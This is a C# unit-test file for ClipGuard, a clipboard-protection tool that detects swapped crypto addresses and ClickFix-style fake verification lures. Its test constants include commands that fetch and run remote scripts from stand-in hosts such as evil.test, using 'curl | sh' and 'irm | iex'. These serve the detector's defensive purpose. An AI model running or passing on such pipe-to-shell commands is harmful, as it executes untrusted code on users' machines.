using ClipGuard.Models;
using ClipGuard.Services;

namespace ClipGuard.Tests;

/// <summary>
/// The swap / warn / defuse matrix. This is the product: everything else is
/// presentation around these decisions.
/// </summary>
public class DetectionPolicyTests
{
    private const string Command = "curl -sL https://evil.test/install.sh | sh";
    private const string OtherCommand = "irm https://evil.test/other.ps1 | iex";
    private const string AddressA = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
    private const string AddressB = "bc1q9d8ftvbn2h4kxs7ug0rl4mc3ep6yzq5tfwe2xa";
    private const string Ordinary = "some perfectly ordinary notes";
    private const string Installer = "irm https://ollama.com/install.ps1 | iex";
    private const string Lure = "irm https://evil.test/a.ps1 | iex # I am not a robot - Verification ID: 9";

    private static DetectionInputs Input(
        string? text,
        string? previous = null,
        string writer = "chrome.exe",
        bool rapid = false,
        bool background = false,
        RuleKind? rule = null,
        bool paused = false,
        bool warnEnabled = true,
        bool defuseEnabled = true,
        params string[] trusted) => new()
        {
            Text = text,
            Previous = previous,
            WriterName = writer,
            ArrivedRapidly = rapid,
            FromBackgroundApp = background,
            Rule = rule,
            IsPaused = paused,
            WarnRiskyContentEnabled = warnEnabled,
            DefuseEnabled = defuseEnabled,
            TrustedSources = trusted
        };

    // ── Ordinary use must stay silent ─────────────────────────────────────

    [Fact]
    public void Plain_text_is_left_alone()
    {
        var outcome = DetectionPolicy.Evaluate(Input(Ordinary, previous: "something else"));

        Assert.False(outcome.Block);
        Assert.False(outcome.Warn);
        Assert.Equal(EventCategory.ClipboardWrite, outcome.Category);
    }

    [Fact]
    public void Rapid_copies_from_the_focused_app_are_not_a_swap()
    {
        // Copying twice in quick succession inside the app you're using is
        // ordinary behaviour, and the content carries no risk shape.
        var outcome = DetectionPolicy.Evaluate(
            Input(Ordinary, previous: "first thing", rapid: true, background: false));

        Assert.False(outcome.Block);
    }

    [Fact]
    public void A_background_app_overwriting_a_fresh_copy_is_blocked_whatever_it_wrote()
    {
        // Speed plus a writer you aren't looking at is two signals, so the
        // content doesn't need to look dangerous - replacing a URL with a
        // different URL is still a swap.
        //
        // This is the rule most likely to catch something innocent: a clipboard
        // manager or sync tool writing just after a copy trips it. That's what
        // the per-app "always allow" rule is for.
        var outcome = DetectionPolicy.Evaluate(
            Input(Ordinary, previous: "first thing", rapid: true, background: true));

        Assert.True(outcome.Block);
    }

    [Fact]
    public void First_copy_of_a_session_is_never_a_swap()
    {
        // Nothing was replaced if there was nothing there.
        var outcome = DetectionPolicy.Evaluate(
            Input(Command, previous: null, rapid: true, background: true));

        Assert.False(outcome.Block);
    }

    [Fact]
    public void Re_copying_identical_content_is_not_a_swap()
    {
        var outcome = DetectionPolicy.Evaluate(
            Input(Command, previous: Command, rapid: true, background: true));

        Assert.False(outcome.Block);
    }

    // ── The swap this app exists for ──────────────────────────────────────

    [Fact]
    public void Address_swapped_for_another_address_in_the_focused_app_is_blocked()
    {
        // The core attack: a page rewrites the clipboard inside your browser,
        // so there is no background signal to lean on - only the shape match.
        var outcome = DetectionPolicy.Evaluate(
            Input(AddressB, previous: AddressA, rapid: true, background: false));

        Assert.True(outcome.Block);
        Assert.True(outcome.HighRiskSwap);
        Assert.Equal(EventCategory.ContentSubstitution, outcome.Category);
    }

    [Fact]
    public void Command_swapped_for_another_command_is_blocked()
    {
        var outcome = DetectionPolicy.Evaluate(
            Input(OtherCommand, previous: Command, rapid: true, background: false));

        Assert.True(outcome.Block);
        Assert.Equal(EventCategory.CommandInjection, outcome.Category);
    }

    [Fact]
    public void A_background_app_writing_something_dangerous_is_blocked()
    {
        var outcome = DetectionPolicy.Evaluate(
            Input(Command, previous: Ordinary, background: true));

        Assert.True(outcome.Block);
    }

    [Fact]
    public void A_slow_swap_slips_through()
    {
        // Documented limit, not an accident: with neither speed nor a
        // background writer there is only one signal, and acting on one signal
        // alone floods the user with false positives.
        var outcome = DetectionPolicy.Evaluate(
            Input(AddressB, previous: AddressA, rapid: false, background: false));

        Assert.False(outcome.Block);
    }

    // ── ClickFix: nothing swapped, a command handed over ──────────────────

    [Fact]
    public void A_command_arriving_on_its_own_warns_and_is_defused()
    {
        var outcome = DetectionPolicy.Evaluate(Input(Command, previous: Ordinary));

        Assert.False(outcome.Block);
        Assert.True(outcome.Warn);
        Assert.True(outcome.Defuse);
        Assert.Equal(EventCategory.SuspiciousContent, outcome.Category);
    }

    [Fact]
    public void A_verification_lure_is_high_risk_but_not_a_swap()
    {
        // It must not render the before/after card: nothing was replaced.
        var outcome = DetectionPolicy.Evaluate(Input(Lure, previous: Ordinary));

        Assert.True(outcome.Warn);
        Assert.True(outcome.HighRisk);
        Assert.False(outcome.HighRiskSwap);
    }

    [Fact]
    public void Addresses_are_warned_about_but_never_defused()
    {
        // Swapping what someone is about to paste into a payment field would be
        // its own hazard.
        var outcome = DetectionPolicy.Evaluate(Input(AddressA, previous: Ordinary));

        Assert.True(outcome.Warn);
        Assert.False(outcome.Defuse);
    }

    [Fact]
    public void An_address_from_a_non_browser_is_not_warned_about()
    {
        // Copying an address out of your own wallet app is routine.
        var outcome = DetectionPolicy.Evaluate(
            Input(AddressA, previous: Ordinary, writer: "electrum.exe"));

        Assert.False(outcome.Warn);
    }

    [Fact]
    public void Our_own_stand_in_never_re_triggers()
    {
        // Otherwise defusing would feed itself forever.
        var standIn = RiskAnalyzer.DefusedReplacementFor(Command);
        var outcome = DetectionPolicy.Evaluate(Input(standIn, previous: Ordinary));

        Assert.False(outcome.Warn);
        Assert.False(outcome.Defuse);
    }

    // ── Trusted install sources ───────────────────────────────────────────

    [Fact]
    public void A_vendor_installer_is_neither_warned_about_nor_blocked()
    {
        var outcome = DetectionPolicy.Evaluate(
            Input(Installer, previous: Ordinary, background: true, rapid: true));

        Assert.False(outcome.Warn);
        Assert.False(outcome.Block);
    }

    [Fact]
    public void A_user_vouched_host_is_honoured()
    {
        var outcome = DetectionPolicy.Evaluate(
            Input("irm https://corp.test/setup.ps1 | iex", previous: Ordinary,
                  trusted: "corp.test"));

        Assert.False(outcome.Warn);
    }

    [Fact]
    public void A_lure_hosted_on_a_trusted_domain_still_warns()
    {
        var outcome = DetectionPolicy.Evaluate(
            Input(Installer + " # I am not a robot - Verification ID: 3", previous: Ordinary));

        Assert.True(outcome.Warn);
    }

    // ── Rules ─────────────────────────────────────────────────────────────

    [Fact]
    public void A_blocked_app_is_blocked_whatever_it_writes()
    {
        var outcome = DetectionPolicy.Evaluate(
            Input(Ordinary, previous: Ordinary, rule: RuleKind.Blocked));

        Assert.True(outcome.Block);
    }

    [Fact]
    public void An_allowed_app_is_never_blocked_or_warned_about()
    {
        var outcome = DetectionPolicy.Evaluate(
            Input(Command, previous: AddressA, rapid: true, background: true,
                  rule: RuleKind.AlwaysAllow));

        Assert.False(outcome.Block);
        Assert.False(outcome.Warn);
    }

    // ── Pause and settings ────────────────────────────────────────────────

    [Fact]
    public void Pausing_stops_everything()
    {
        var outcome = DetectionPolicy.Evaluate(
            Input(Command, previous: AddressA, rapid: true, background: true, paused: true));

        Assert.False(outcome.Block);
        Assert.False(outcome.Warn);
        Assert.False(outcome.Defuse);
    }

    [Fact]
    public void Warnings_off_also_disables_defusing()
    {
        // Defusing without a warning would silently rewrite the clipboard.
        var outcome = DetectionPolicy.Evaluate(
            Input(Command, previous: Ordinary, warnEnabled: false));

        Assert.False(outcome.Warn);
        Assert.False(outcome.Defuse);
    }

    [Fact]
    public void Defusing_off_still_warns()
    {
        var outcome = DetectionPolicy.Evaluate(
            Input(Command, previous: Ordinary, defuseEnabled: false));

        Assert.True(outcome.Warn);
        Assert.False(outcome.Defuse);
    }

    [Fact]
    public void Blocking_still_happens_with_warnings_switched_off()
    {
        // The warning toggle governs content warnings, not swap protection.
        var outcome = DetectionPolicy.Evaluate(
            Input(AddressB, previous: AddressA, rapid: true, warnEnabled: false));

        Assert.True(outcome.Block);
    }

    // ── Content we can't read ─────────────────────────────────────────────

    [Fact]
    public void Non_text_content_is_never_judged()
    {
        // Images and file drops arrive as null; there's nothing to reason about.
        var outcome = DetectionPolicy.Evaluate(
            Input(null, previous: AddressA, rapid: true, background: true));

        Assert.False(outcome.Block);
        Assert.False(outcome.Warn);
    }

    [Fact]
    public void Clearing_the_clipboard_is_not_a_swap()
    {
        var outcome = DetectionPolicy.Evaluate(
            Input("", previous: AddressA, rapid: true, background: true));

        Assert.False(outcome.Block);
    }
}
